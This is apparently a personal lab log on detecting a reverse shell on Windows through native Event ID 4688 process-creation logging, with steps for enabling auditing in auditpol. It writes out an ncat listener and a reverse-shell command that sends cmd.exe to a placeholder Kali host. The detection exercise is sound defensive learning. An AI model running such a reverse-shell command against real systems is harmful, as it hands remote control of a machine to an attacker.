
# 🔐 Day 2 of 30 — Reverse Shell Logging on Windows

# 📅 Date: April 14, 2025
# 📁 Project: Detecting Reverse Shells using Native Windows Logs

#  🧠 Objective:
Capture and observe the reverse shell activity using **native Windows event logging** (without Sysmon) and validate it with **Event ID 4688**.

---

# ⚙️ Tools Used:
- Windows 10 (Victim)
- Kali Linux (Attacker)
- `ncat` for reverse shell
- Windows Event Viewer
- Auditpol command-line tool

---

# 🪝 Phase 1: Reverse Shell Setup
- Started a listener on Kali:
  ```bash
  ncat -lvp 7777
  ```
- Sent reverse shell from Windows:
  ```powershell
  ncat <KALI_IP> 7777 -e cmd.exe
  ```
- Verified successful connection.

---

# 🔍 Phase 2: Log Analysis
- Enabled process creation logging:
  ```cmd
  auditpol /set /subcategory:"Process Creation" /success:enable
  ```
- Opened **Event Viewer → Windows Logs → Security**
- Found Event ID 4688 which logs the new process (`cmd.exe`) creation.


---

### 🚀 Phase 3: Documentation & Wrap-Up
- Documented the project
- Saved screenshot of logs
- Understood how blue teams detect reverse shells without Sysmon

---

### 🤔 Why This Matters:
This shows how defenders can **spot unauthorized shells** even with basic Windows logging — making it a foundational detection technique.

---

# 📌 Tags:
`#WindowsLogging` `#ReverseShell` `#EventID4688` `#DetectionEngineering` `#Cybersecurity` `#90DayCyber`
